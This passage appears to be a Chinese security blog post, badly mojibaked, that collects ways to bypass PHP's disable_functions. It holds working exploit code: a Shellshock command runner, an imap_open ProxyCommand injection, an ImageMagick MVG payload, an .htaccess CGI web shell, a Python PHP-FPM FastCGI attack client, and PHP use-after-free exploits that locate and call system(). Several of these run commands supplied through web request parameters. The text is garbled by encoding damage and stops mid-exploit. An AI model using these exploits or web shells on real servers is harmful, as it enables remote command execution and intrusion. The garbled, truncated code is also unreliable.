King (Starfall) # Vendor Homepage: http://php.net # Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror # Version: 5.* (tested on 5.6.2) # Tested on: Debian 7 and CentOS 5 and 6 # CVE: CVE-2014-6271 function shellshock($cmd) // Execute a command via CVE-2014-6271 @mail.c:283 $tmp = tempnam(.,data); putenv(PHP_LOL=() x; ; $cmd $tmp 21); // In Safe Mode, the user may only alter environment variableswhose names // begin with the prefixes supplied by this directive. // By default, users will only be able to set environment variablesthat // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, // PHP will let the user modify ANY environment variable! //mail(a@127.0.0.1,,,,-bv); // -bv so we dont actuallysend any mail error_log(a,1); $output = @file_get_contents($tmp); @unlink($tmp); if($output != ) return $output; else return No output, or not vuln.; echo shellshock($_REQUEST[cmd]); ? ä¿å­˜ä¸ºphpä¸Šä¼ åˆ°ç›®å½• è®¿é—®æ‰§è¡Œå‘½ä»¤å³å¯ imap_openä½¿ç”¨æ¡ä»¶ï¼š 1.æœ‰imapæ‰©å±• 2.php.iniä¸­å¼€å¯imap.enable_insecure_rshé€‰é¡¹ä¸ºOn æ¼æ´æˆå› ï¼š PHP çš„imap_openå‡½æ•°ä¸­çš„æ¼æ´å¯èƒ½å…è®¸ç»è¿‡èº«ä»½éªŒè¯çš„è¿œç¨‹æ”»å‡»è€…åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´çš„å­˜åœ¨æ˜¯å› ä¸ºå—å½±å“çš„è½¯ä»¶çš„imap_openå‡½æ•°åœ¨å°†é‚®ç®±åç§°ä¼ é€’ç»™rshæˆ–sshå‘½ä»¤ä¹‹å‰ä¸æ­£ç¡®åœ°è¿‡æ»¤é‚®ç®±åç§°ã€‚å¦‚æœå¯ç”¨äº†rshå’ŒsshåŠŸèƒ½å¹¶ä¸”rshå‘½ä»¤æ˜¯sshå‘½ä»¤çš„ç¬¦å·é“¾æ¥ï¼Œåˆ™æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘ç›®æ ‡ç³»ç»Ÿå‘é€åŒ…å«-oProxyCommandå‚æ•°çš„æ¶æ„IMAPæœåŠ¡å™¨åç§°æ¥åˆ©ç”¨æ­¤æ¼æ´ã€‚æˆåŠŸçš„æ”»å‡»å¯èƒ½å…è®¸æ”»å‡»è€…ç»•è¿‡å…¶ä»–ç¦ç”¨çš„exec å—å½±å“è½¯ä»¶ä¸­çš„åŠŸèƒ½ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨è¿™äº›åŠŸèƒ½åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„shellå‘½ä»¤ã€‚ æ”»å‡»ï¼š ?php error_reporting(0); if (!function_exists(imap_open)) die(no imap_open function!); $server = x -oProxyCommand=echot . base64_encode($_GET[cmd] ./tmp/cmd_result) . |base64t-d|sh; //$server = x -oProxyCommand=echo$IFS$() . base64_encode($_GET[cmd] ./tmp/cmd_result) . |base64$IFS$()-d|sh; imap_open( . $server . :143/imapINBOX, , ); // orvar_dump(nnError: .imap_last_error()); sleep(5); echo file_get_contents(/tmp/cmd_result); ? Pcntlç»„ä»¶ä½¿ç”¨æ¡ä»¶ï¼š 1.ç›®æ ‡æœºå™¨å®‰è£…å¹¶å¯ç”¨äº†phpç»„ä»¶Pcntl æ¼æ´æˆå› : ä½¿ç”¨pcntl_exec()è¿™ä¸ªpcntlæ’ä»¶ä¸“æœ‰çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤,ä¹Ÿç®—æ˜¯è¿‡é»‘åå•çš„ä¸€é’Ÿ,æ¯”è¾ƒç®€å•ã€‚ æ”»å‡»æ€è·¯ï¼š #pcntl_exec().php?php pcntl_exec(/bin/bash, array(/tmp/b4dboy.sh));?#/tmp/b4dboy.sh#!/bin/bashls -l / ImageMagick æ¼æ´ç»•è¿‡(CVE-2016â€“3714)ä½¿ç”¨æ¡ä»¶: 1.ç›®æ ‡ä¸»æœºå®‰è£…äº†æ¼æ´ç‰ˆæœ¬çš„imagemagickï¼ˆ 3.3.0ï¼‰ 2.å®‰è£…äº†php-imagickæ‹“å±•å¹¶åœ¨php.iniä¸­å¯ç”¨ï¼› 3.ç¼–å†™phpé€šè¿‡new Imagickå¯¹è±¡çš„æ–¹å¼æ¥å¤„ç†å›¾ç‰‡ç­‰æ ¼å¼æ–‡ä»¶ï¼› 4.PHP 5.4 ImageMagickä»‹ç»ImageMagickæ˜¯ä¸€æ¬¾ä½¿ç”¨é‡å¾ˆå¹¿çš„å›¾ç‰‡å¤„ç†ç¨‹åºï¼Œå¾ˆå¤šå‚å•†éƒ½è°ƒç”¨äº†è¿™ä¸ªç¨‹åºè¿›è¡Œå›¾ç‰‡å¤„ç†ï¼ŒåŒ…æ‹¬å›¾ç‰‡çš„ä¼¸ç¼©ã€åˆ‡å‰²ã€æ°´å°ã€æ ¼å¼è½¬æ¢ç­‰ç­‰ã€‚ åœ¨ ImageMagick çš„é»˜è®¤é…ç½®æ–‡ä»¶ etcImageMagickdelegates.xml é‡Œå¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„å§”æ‰˜ã€‚è¿™ä¸ªæ–‡ä»¶å®šä¹‰äº†å¾ˆå¤šå ä½ç¬¦ï¼Œæ¯”å¦‚ %i æ˜¯è¾“å…¥çš„æ–‡ä»¶åï¼Œ%l æ˜¯å›¾ç‰‡exif labelä¿¡æ¯ã€‚è€Œåœ¨åé¢ command çš„ä½ç½®ï¼Œ%i å’Œ %l ç­‰å ä½ç¬¦è¢«æ‹¼æ¥åœ¨å‘½ä»¤è¡Œä¸­ã€‚è¿™ä¸ªæ¼æ´ä¹Ÿå› æ­¤è€Œæ¥ï¼Œè¢«æ‹¼æ¥å®Œæ¯•çš„å‘½ä»¤è¡Œä¼ å…¥äº†ç³»ç»Ÿçš„systemå‡½æ•°ï¼Œè€Œæˆ‘ä»¬åªéœ€ä½¿ç”¨åå¼•å·æˆ–é—­åˆåŒå¼•å·ï¼Œæ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚å¦‚æœåœ¨phpinfoä¸­çœ‹åˆ°æœ‰è¿™ä¸ªImageMagick å°±å¯ä»¥å°è¯•ä¸€ä¸‹è¿™ä¸ª ?phpecho Disable Functions: . ini_get(disable_functions) . ;$command = PHP_SAPI == cli ? $argv[1] : $_GET[cmd];if ($command == ) $command = id;$exploit = EOFpush graphic-contextviewbox 0 0 640 480fill url(https://example.com/image.jpg|$command)pop graphic-contextEOF;file_put_contents(KKKK.mvg, $exploit);$thumb = new Imagick();$thumb-readImage(KKKK.mvg);$thumb-writeImage(KKKK.png);$thumb-clear();$thumb-destroy();unlink(KKKK.mvg);unlink(KKKK.png);? Apache Mod CGIä½¿ç”¨æ¡ä»¶: 1.Apache + PHP (apache ä½¿ç”¨ apache_mod_php) 2.pache å¼€å¯äº† cgi, rewrite 3.Web ç›®å½•ç»™äº† AllowOverride æƒé™ æ¼æ´æˆå› ï¼š ä»»ä½•å…·æœ‰MIMEç±»å‹application/x-httpd-cgiæˆ–è€…è¢«cgi-scriptå¤„ç†å™¨å¤„ç†çš„æ–‡ä»¶éƒ½å°†è¢«ä½œä¸ºCGIè„šæœ¬å¯¹å¾…å¹¶ç”±æœåŠ¡å™¨è¿è¡Œï¼Œå®ƒçš„è¾“å‡ºå°†è¢«è¿”å›ç»™å®¢æˆ·ç«¯ã€‚å¯ä»¥é€šè¿‡ä¸¤ç§é€”å¾„ä½¿æ–‡ä»¶æˆä¸ºCGIè„šæœ¬ï¼Œä¸€ç§æ˜¯æ–‡ä»¶å…·æœ‰å·²ç”±AddTypeæŒ‡ä»¤å®šä¹‰çš„æ‰©å±•åï¼Œå¦ä¸€ç§æ˜¯æ–‡ä»¶ä½äºScriptAliasç›®å½•ä¸­ã€‚å½“Apache å¼€å¯äº†cgi, rewriteæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨.htaccessæ–‡ä»¶ï¼Œä¸´æ—¶å…è®¸ä¸€ä¸ªç›®å½•å¯ä»¥æ‰§è¡Œcgiç¨‹åºå¹¶ä¸”ä½¿å¾—æœåŠ¡å™¨å°†è‡ªå®šä¹‰çš„åç¼€è§£æä¸ºcgiç¨‹åºï¼Œåˆ™å¯ä»¥åœ¨ç›®çš„ç›®å½•ä¸‹ä½¿ç”¨.htaccessæ–‡ä»¶è¿›è¡Œé…ç½®ã€‚ æ”»å‡»: åœ¨webç›®å½•ä¸‹ä¸Šä¼ .htaccess Options +ExecCGIAddHandler cgi-script .ant ä¸Šä¼ shell.ant #!/bin/shecho Content-type: text/htmlecho echoid ç„¶åç»™shell.antåŠ ä¸Šæƒé™ ç›´æ¥è®¿é—®å³å¯å¾—åˆ°å‘½ä»¤æ‰§è¡Œç»“æœ PHP-FPMFastCGIä½¿ç”¨æ¡ä»¶ï¼š phpinfoæŸ¥çœ‹ç›®æ ‡ä¸»æœºæ˜¯å¦é…ç½®äº† FPM/Fastcgi æ¦‚å¿µï¼š Fastcgiå…¶å®æ˜¯ä¸€ä¸ªé€šä¿¡åè®®ï¼Œå’ŒHTTPåè®®ä¸€æ ·ï¼Œéƒ½æ˜¯è¿›è¡Œæ•°æ®äº¤æ¢çš„ä¸€ä¸ªé€šé“ã€‚ PHP-FPM(PHP FastCGI Process Manager)æ„ï¼šPHP FastCGI è¿›ç¨‹ç®¡ç†å™¨ï¼Œç”¨äºç®¡ç†PHP è¿›ç¨‹æ± çš„è½¯ä»¶ï¼Œç”¨äºæ¥å—webæœåŠ¡å™¨çš„è¯·æ±‚ã€‚ FPMå°±æ˜¯Fastcgiçš„åè®®è§£æå™¨ï¼ŒWebæœåŠ¡å™¨ä½¿ç”¨CGIåè®®å°è£…å¥½ç”¨æˆ·çš„è¯·æ±‚å‘é€ç»™FPMã€‚FPMæŒ‰ç…§CGIçš„åè®®å°†TCPæµè§£ææˆçœŸæ­£çš„æ•°æ®ã€‚ç±»æ¯”HTTPåè®®æ¥è¯´ï¼Œfastcgiåè®®åˆ™æ˜¯æœåŠ¡å™¨ä¸­é—´ä»¶å’ŒæŸä¸ªè¯­è¨€åç«¯è¿›è¡Œæ•°æ®äº¤æ¢çš„åè®®ã€‚Fastcgiåè®®ç”±å¤šä¸ªrecordç»„æˆï¼Œrecordä¹Ÿæœ‰headerå’Œbodyä¸€è¯´ï¼ŒæœåŠ¡å™¨ä¸­é—´ä»¶å°†è¿™äºŒè€…æŒ‰ç…§fastcgiçš„è§„åˆ™å°è£…å¥½å‘é€ç»™è¯­è¨€åç«¯ï¼Œè¯­è¨€åç«¯è§£ç ä»¥åæ‹¿åˆ°å…·ä½“æ•°æ®ï¼Œè¿›è¡ŒæŒ‡å®šæ“ä½œï¼Œå¹¶å°†ç»“æœå†æŒ‰ç…§è¯¥åè®®å°è£…å¥½åè¿”å›ç»™æœåŠ¡å™¨ä¸­é—´ä»¶ã€‚ å’ŒHTTPå¤´ä¸åŒï¼Œrecordçš„å¤´å›ºå®š8ä¸ªå­—èŠ‚ï¼Œbodyæ˜¯ç”±å¤´ä¸­çš„contentLengthæŒ‡å®šï¼Œå…¶ç»“æ„å¦‚ä¸‹ï¼š typedef struct /* Header */ unsigned char version; // ç‰ˆæœ¬ unsigned char type; // æœ¬æ¬¡recordçš„ç±»å‹ unsigned char requestIdB1; // æœ¬æ¬¡recordå¯¹åº”çš„è¯·æ±‚id unsigned char requestIdB0; unsigned char contentLengthB1; // bodyä½“çš„å¤§å° unsigned char contentLengthB0; unsigned char paddingLength; // é¢å¤–å—å¤§å° unsigned char reserved; /* Body */ unsigned char contentData[contentLength]; unsigned char paddingData[paddingLength]; FCGI_Record; å¤´ç”±8ä¸ªucharç±»å‹çš„å˜é‡ç»„æˆï¼Œæ¯ä¸ªå˜é‡1å­—èŠ‚ã€‚å…¶ä¸­ï¼ŒrequestIdå ä¸¤ä¸ªå­—èŠ‚ï¼Œä¸€ä¸ªå”¯ä¸€çš„æ ‡å¿—idï¼Œä»¥é¿å…å¤šä¸ªè¯·æ±‚ä¹‹é—´çš„å½±å“ï¼›contentLengthå ä¸¤ä¸ªå­—èŠ‚ï¼Œè¡¨ç¤ºbodyçš„å¤§å°ã€‚ äº†è§£äº†åè®®åŸç†å’Œå†…å®¹ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ä½¿ç”¨CGIåè®®å°è£…è¯·æ±‚ï¼Œé€šè¿‡Socketæ¥ç›´æ¥ä¸FPMé€šä¿¡ã€‚pç¥é€šè¿‡PHP-FPMçš„ç¯å¢ƒå˜é‡PHP_VALUEå’ŒPHP_ADMIN_VALUEè®¾ç½®php.inié…ç½®é¡¹ï¼Œé€šè¿‡é…ç½®é¡¹auto_prepend_fileå’Œauto_append_fileç»“åˆphp://inputåŒ…å«ä»»æ„phpä»£ç å¹¶æ‰§è¡Œï¼Œå¹¶ä¸”ä¿®æ”¹äº†è¿œç¨‹æ–‡ä»¶åŒ…å«é€‰é¡¹allow_url_includeä¸ºon exp: import socketimport randomimport argparseimport sysfrom io import BytesIO# Referrer: https://github.com/wuyunfeng/Python-FastCGI-ClientPY2 = True if sys.version_info.major == 2 else Falsedef bchr(i): if PY2: return force_bytes(chr(i)) else: return bytes([i])def bord(c): if isinstance(c, int): return c else: return ord(c)def force_bytes(s): if isinstance(s, bytes): return s else: return s.encode(utf-8, strict)def force_text(s): if issubclass(type(s), str): return s if isinstance(s, bytes): s = str(s, utf-8, strict) else: s = str(s) return sclass FastCGIClient: A Fast-CGI Client for Python # private __FCGI_VERSION = 1 __FCGI_ROLE_RESPONDER = 1 __FCGI_ROLE_AUTHORIZER = 2 __FCGI_ROLE_FILTER = 3 __FCGI_TYPE_BEGIN = 1 __FCGI_TYPE_ABORT = 2 __FCGI_TYPE_END = 3 __FCGI_TYPE_PARAMS = 4 __FCGI_TYPE_STDIN = 5 __FCGI_TYPE_STDOUT = 6 __FCGI_TYPE_STDERR = 7 __FCGI_TYPE_DATA = 8 __FCGI_TYPE_GETVALUES = 9 __FCGI_TYPE_GETVALUES_RESULT = 10 __FCGI_TYPE_UNKOWNTYPE = 11 __FCGI_HEADER_SIZE = 8 # request state FCGI_STATE_SEND = 1 FCGI_STATE_ERROR = 2 FCGI_STATE_SUCCESS = 3 def __init__(self, host, port, timeout, keepalive): self.host = host self.port = port self.timeout = timeout if keepalive: self.keepalive = 1 else: self.keepalive = 0 self.sock = None self.requests = dict() def __connect(self): self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.sock.settimeout(self.timeout) self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # if self.keepalive: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1) # else: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0) try: self.sock.connect((self.host, int(self.port))) except socket.error as msg: self.sock.close() self.sock = None print(repr(msg)) return False return True def __encodeFastCGIRecord(self, fcgi_type, content, requestid): length = len(content) buf = bchr(FastCGIClient.__FCGI_VERSION) \\ + bchr(fcgi_type) \\ + bchr((requestid 8) 0xFF) \\ + bchr(requestid 0xFF) \\ + bchr((length 8) 0xFF) \\ + bchr(length 0xFF) \\ + bchr(0) \\ + bchr(0) \\ + content return buf def __encodeNameValueParams(self, name, value): nLen = len(name) vLen = len(value) record = b if nLen 128: record += bchr(nLen) else: record += bchr((nLen 24) | 0x80) \\ + bchr((nLen 16) 0xFF) \\ + bchr((nLen 8) 0xFF) \\ + bchr(nLen 0xFF) if vLen 128: record += bchr(vLen) else: record += bchr((vLen 24) | 0x80) \\ + bchr((vLen 16) 0xFF) \\ + bchr((vLen 8) 0xFF) \\ + bchr(vLen 0xFF) return record + name + value def __decodeFastCGIHeader(self, stream): header = dict() header[version] = bord(stream[0]) header[type] = bord(stream[1]) header[requestId] = (bord(stream[2]) 8) + bord(stream[3]) header[contentLength] = (bord(stream[4]) 8) + bord(stream[5]) header[paddingLength] = bord(stream[6]) header[reserved] = bord(stream[7]) return header def __decodeFastCGIRecord(self, buffer): header = buffer.read(int(self.__FCGI_HEADER_SIZE)) if not header: return False else: record = self.__decodeFastCGIHeader(header) record[content] = b if contentLength in record.keys(): contentLength = int(record[contentLength]) record[content] += buffer.read(contentLength) if paddingLength in record.keys(): skiped = buffer.read(int(record[paddingLength])) return record def request(self, nameValuePairs=, post=): if not self.__connect(): print(connect failure! please check your fasctcgi-server !!) return requestId = random.randint(1, (1 16) - 1) self.requests[requestId] = dict() request = b beginFCGIRecordContent = bchr(0) \\ + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\ + bchr(self.keepalive) \\ + bchr(0) * 5 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN, beginFCGIRecordContent, requestId) paramsRecord = b if nameValuePairs: for (name, value) in nameValuePairs.items(): name = force_bytes(name) value = force_bytes(value) paramsRecord += self.__encodeNameValueParams(name, value) if paramsRecord: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b, requestId) if post: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b, requestId) self.sock.send(request) self.requests[requestId][state] = FastCGIClient.FCGI_STATE_SEND self.requests[requestId][response] = b return self.__waitForResponse(requestId) def __waitForResponse(self, requestId): data = b while True: buf = self.sock.recv(512) if not len(buf): break data += buf data = BytesIO(data) while True: response = self.__decodeFastCGIRecord(data) if not response: break if response[type] == FastCGIClient.__FCGI_TYPE_STDOUT \\ or response[type] == FastCGIClient.__FCGI_TYPE_STDERR: if response[type] == FastCGIClient.__FCGI_TYPE_STDERR: self.requests[state] = FastCGIClient.FCGI_STATE_ERROR if requestId == int(response[requestId]): self.requests[requestId][response] += response[content] if response[type] == FastCGIClient.FCGI_STATE_SUCCESS: self.requests[requestId] return self.requests[requestId][response] def __repr__(self): return fastcgi connect host: port:.format(self.host, self.port)if __name__ == __main__: parser = argparse.ArgumentParser(description=Php-fpm code execution vulnerability client.) parser.add_argument(host, help=Target host, such as 127.0.0.1) parser.add_argument(file, help=A php file absolute path, such as /usr/local/lib/php/System.php) parser.add_argument(-c, --code, help=What php code your want to execute, default=?php phpinfo(); exit; ?) parser.add_argument(-p, --port, help=FastCGI port, default=9000, type=int) args = parser.parse_args() client = FastCGIClient(args.host, args.port, 3, 0) params = dict() documentRoot = / uri = args.file content = args.code params = GATEWAY_INTERFACE: FastCGI/1.0, REQUEST_METHOD: POST, SCRIPT_FILENAME: documentRoot + uri.lstrip(/), SCRIPT_NAME: uri, QUERY_STRING: , REQUEST_URI: uri, DOCUMENT_ROOT: documentRoot, SERVER_SOFTWARE: php/fcgiclient, REMOTE_ADDR: 127.0.0.1, REMOTE_PORT: 9985, SERVER_ADDR: 127.0.0.1, SERVER_PORT: 80, SERVER_NAME: localhost, SERVER_PROTOCOL: HTTP/1.1, CONTENT_TYPE: application/text, CONTENT_LENGTH: %d % len(content), PHP_VALUE: auto_prepend_file = php://input, PHP_ADMIN_VALUE: allow_url_include = On response = client.request(params, content) print(force_text(response)) è„šæœ¬ä½¿ç”¨æ–¹æ³•ï¼špython 111.py ip /var/www/html/index.php -p port -c ?php system(ls /); ? ä¹Ÿå¯ä»¥ä½¿ç”¨antswordæ’ä»¶ GC UAFåˆ©ç”¨æ¡ä»¶ 1.Linux æ“ä½œç³»ç»Ÿ 2.PHP7.0 - all versions to date 3.PHP7.1 - all versions to date 4.PHP7.2 - all versions to date 5.PHP7.3 - all versions to date æ”»å‡»exp: ?php# PHP 7.0-7.3 disable_functions bypass PoC (*nix only)## Bug: https://bugs.php.net/bug.php?id=72530## This exploit should work on all PHP 7.0-7.3 versions## Author: https://github.com/mm0r1pwn(uname -a);function pwn($cmd) global $abc, $helper; function str2ptr($str, $p = 0, $s = 8) $address = 0; for($j = $s-1; $j = 0; $j--) $address = 8; $address |= ord($str[$p+$j]); return $address; function ptr2str($ptr, $m = 8) $out = ; for ($i=0; $i $m; $i++) $out .= chr($ptr 0xff); $ptr = 8; return $out; function write($str, $p, $v, $n = 8) $i = 0; for($i = 0; $i $n; $i++) $str[$p + $i] = chr($v 0xff); $v = 8; function leak($addr, $p = 0, $s = 8) global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak = strlen($helper-a); if($s != 8) $leak %= 2 ($s * 8) - 1; return $leak; function parse_elf($base) $e_type = leak($base, 0x10, 2); $e_phoff = leak($base, 0x20); $e_phentsize = leak($base, 0x36, 2); $e_phnum = leak($base, 0x38, 2); for($i = 0; $i $e_phnum; $i++) $header = $base + $e_phoff + $i * $e_phentsize; $p_type = leak($header, 0, 4); $p_flags = leak($header, 4, 4); $p_vaddr = leak($header, 0x10); $p_memsz = leak($header, 0x28); if($p_type == 1 $p_flags == 6) # PT_LOAD, PF_Read_Write # handle pie $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr; $data_size = $p_memsz; else if($p_type == 1 $p_flags == 5) # PT_LOAD, PF_Read_exec $text_size = $p_memsz; if(!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; function get_basic_funcs($base, $elf) list($data_addr, $text_size, $data_size) = $elf; for($i = 0; $i $data_size / 8; $i++) $leak = leak($data_addr, $i * 8); if($leak - $base 0 $leak - $base $data_addr - $base) $deref = leak($leak); # constant constant check if($deref != 0x746e6174736e6f63) continue; else continue; $leak = leak($data_addr, ($i + 4) * 8); if($leak - $base 0 $leak - $base $data_addr - $base) $deref = leak($leak); # bin2hex constant check if($deref != 0x786568326e6962) continue; else continue; return $data_addr + $i * 8; function get_binary_base($binary_leak) $base = 0; $start = $binary_leak 0xfffffffffffff000; for($i = 0; $i 0x1000; $i++) $addr = $start - 0x1000 * $i; $leak = leak($addr, 0, 7); if($leak == 0x10102464c457f) # ELF header return $addr; function get_system($basic_funcs) $addr = $basic_funcs; do $f_entry = leak($addr); $f_name = leak($f_entry, 0, 6); if($f_name == 0x6d6574737973) # system return leak($addr + 8); $addr += 0x20; while($f_entry != 0); return false; class ryat var $ryat; var $chtg; function __destruct() $this-chtg = $this-ryat; $this-ryat = 1; class Helper public $a, $b, $c, $d; if(stristr(PHP_OS, WIN)) die(This PoC is for *nix systems only.); $n_alloc = 10; # increase this value if you get segfaults $contiguous = []; for($i = 0; $i $n_alloc; $i++) $contiguous[] = str_repeat(A, 79); $poc = a:4:i:0;i:1;i:1;a:1:i:0;O:4:ryat:2:s:4:ryat;R:3;s:4:chtg;i:2;i:1;i:3;i:2;R:5;; $out = unserialize($poc); gc_collect_cycles(); $v = []; $v[0] = ptr2str(0, 79); unset($v); $abc = $out[2][0]; $helper = new Helper; $helper-b = function ($x) ; if(strlen($abc) == 79 || strlen($abc) == 0) die(UAF failed); # leaks $closure_handlers = str2ptr($abc, 0); $php_heap = str2ptr($abc, 0x58); $abc_addr = $php_heap - 0xc8; # fake value write($abc, 0x60, 2); write($abc, 0x70, 6); # fake reference write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj = str2ptr($abc, 0x20); $binary_leak = leak($closure_handlers, 8); if(!($base = get_binary_base($binary_leak))) die(Couldnt determine binary base address); if(!($elf = parse_elf($base))) die(Couldnt parse ELF header); if(!($basic_funcs = get_basic_funcs($base, $elf))) die(Couldnt get basic_functions address); if(!($zif_system = get_system($basic_funcs))) die(Couldnt get zif_system address); # fake closure object $fake_obj_offset = 0xd0; for($i = 0; $i 0x110; $i += 8) write($abc, $fake_obj_offset + $i, leak($closure_obj, $i)); # pwn write($abc, 0x20, $abc_addr + $fake_obj_offset); write($abc, 0xd0 + 0x38, 1, 4); # internal func type write($abc, 0xd0 + 0x68, $zif_system); # internal func handler ($helper-b)($cmd); exit(); ä¹Ÿå¯ä»¥ä½¿ç”¨antswordçš„æ’ä»¶ Json Serializer UAFåˆ©ç”¨æ¡ä»¶ï¼š åˆ©ç”¨æ¡ä»¶ Linux æ“ä½œç³»ç»Ÿ PHP7.1 - all versions to date PHP7.2 7.2.19 (released: 30 May 2019) PHP7.3 7.3.6 (released: 30 May 2019) æ”»å‡»exp: ?php$cmd = id;$n_alloc = 10; # increase this value if you get segfaultsclass MySplFixedArray extends SplFixedArray public static $leak;class Z implements JsonSerializable public function write($str, $p, $v, $n = 8) $i = 0; for($i = 0; $i $n; $i++) $str[$p + $i] = chr($v 0xff); $v = 8; public function str2ptr($str, $p = 0, $s = 8) $address = 0; for($j = $s-1; $j = 0; $j--) $address = 8; $address |= ord($str[$p+$j]); return $address; public function ptr2str($ptr, $m = 8) $out = ; for ($i=0; $i $m; $i++) $out .= chr($ptr 0xff); $ptr = 8; return $out; # unable to leak ro segments public function leak1($addr) global $spl1; $this-write($this-abc, 8, $addr - 0x10); return strlen(get_class($spl1)); # the real deal public function leak2($addr, $p = 0, $s = 8) global $spl1, $fake_tbl_off; # fake reference zval $this-write($this-abc, $fake_tbl_off + 0x10, 0xdeadbeef); # gc_refcounted $this-write($this-abc, $fake_tbl_off + 0x18, $addr + $p - 0x10); # zval $this-write($this-abc, $fake_tbl_off + 0x20, 6); # type (string) $leak = strlen($spl1::$leak); if($s != 8) $leak %= 2 ($s * 8) - 1; return $leak; public function parse_elf($base) $e_type = $this-leak2($base, 0x10, 2); $e_phoff = $this-leak2($base, 0x20); $e_phentsize = $this-leak2($base, 0x36, 2); $e_phnum = $this-leak2($base, 0x38, 2); for($i = 0; $i $e_phnum; $i++) $header = $base + $e_phoff + $i * $e_phentsize; $p_type = $this-leak2($header, 0, 4); $p_flags = $this-leak2($header, 4, 4); $p_vaddr = $this-leak2($header, 0x10); $p_memsz = $this-leak2($header, 0x28); if($p_type == 1 $p_flags == 6) # PT_LOAD, PF_Read_Write # handle pie $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr; $data_size = $p_memsz; else if($p_type == 1 $p_flags == 5) # PT_LOAD, PF_Read_exec $text_size = $p_memsz; if(!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; public function get_basic_funcs($base, $elf) list($data_addr, $text_size, $data_size) = $elf; for($i = 0; $i $data_size / 8; $i++) $leak = $this-leak2($data_addr, $i * 8); if($leak - $base 0 $leak - $base $data_addr - $base) $deref = $this-leak2($leak); # constant constant check if($deref != 0x746e6174736e6f63) continue; else continue; $leak = $this-leak2($data_addr, ($i + 4) * 8); if($leak - $base 0 $leak - $base $data_addr - $base) $deref = $this-leak2($leak); # bin2hex constant check if($deref != 0x786568326e6962) continue; else continue; return $data_addr + $i * 8; public function get_binary_base($binary_leak) $base = 0; $start = $binary_leak 0xfffffffffffff000; for($i = 0; $i 0x1000; $i++) $addr = $start - 0x1000 * $i; $leak = $this-leak2($addr, 0, 7); if($leak == 0x10102464c457f) # ELF header return $addr; public function get_system($basic_funcs) $addr = $basic_funcs; do $f_entry = $this-leak2($addr); $f_name = $this-leak2($f_entry, 0, 6); if($f_name == 0x6d6574737973) # system return $this-leak2($addr + 8); $addr += 0x20; while($f_entry != 0); return false; public function jsonSerialize() global $y, $cmd, $spl1, $fake_tbl_off, $n_alloc; $contiguous = []; for($i = 0; $i $n_alloc; $i++) $contiguous[] = new DateInterval(PT1S); $room = []; for($i = 0; $i $n_alloc; $i++) $room[] = new Z(); $_protector = $this-ptr2str(0, 78); $this-abc = $this-ptr2str(0, 79); $p = new DateInterval(PT1S); unset($y[0]); unset($p); $protector = .$_protector; $x = new DateInterval(PT1S); $x-d = 0x2000; $x-h = 0xdeadbeef; # $this-abc is now of size 0x2000 if($this-str2ptr($this-abc) != 0xdeadbeef) die(UAF failed.); $spl1 = new MySplFixedArray(); $spl2 = new MySplFixedArray(); # some leaks $class_entry = $this-str2ptr($this-abc, 0x120); $handlers = $this-str2ptr($this-abc, 0x128); $php_heap = $this-str2ptr($this-abc, 0x1a8); $abc_addr = $php_heap - 0x218; # create a fake class_entry $fake_obj = $abc_addr; $this-write($this-abc, 0, 2); # type $this-write($this-abc, 0x120, $abc_addr); # fake class_entry # copy some of class_entry definition for($i = 0; $i 16; $i++) $this-write($this-abc, 0x10 + $i * 8, $this-leak1($class_entry + 0x10 + $i * 8)); # fake static members table $fake_tbl_off = 0x70 * 4 - 16; $this-write($this-abc, 0x30, $abc_addr + $fake_tbl_off); $this-write($this-abc, 0x38, $abc_addr + $fake_tbl_off); # fake zval_reference $this-write($this-abc, $fake_tbl_off, $abc_addr + $fake_tbl_off + 0x10); # zval $this-write($this-abc, $fake_tbl_off + 8, 10); # zval type (reference) # look for binary base $binary_leak = $this-leak2($handlers + 0x10); if(!($base = $this-get_binary_base($binary_leak))) die(Couldnt determine binary base address); # parse elf header if(!($elf = $this-parse_elf($base))) die(Couldnt parse ELF); # get basic_functions address if(!($basic_funcs = $this-get_basic_funcs($base, $elf))) die(Couldnt get basic_functions address); # find system entry if(!($zif_system = $this-get_system($basic_funcs))) die(Couldnt get zif_system address); # copy hashtable offsetGet bucket $fake_bkt_off = 0x70 * 5 - 16; $function_data = $this-str2ptr($this-abc, 0x50); for($i = 0; $i 4; $i++) $this-write($this-abc, $fake_bkt_off + $i * 8, $this-leak2($function_data + 0x40 * 4, $i * 8)); # create a fake bucket $fake_bkt_addr = $abc_addr + $fake_bkt_off; $this-write($this-abc, 0x50, $fake_bkt_addr); for($i = 0; $i 3; $i++) $this-write($this-abc, 0x58 + $i * 4, 1, 4); # copy bucket zval $function_zval = $this-str2ptr($this-abc, 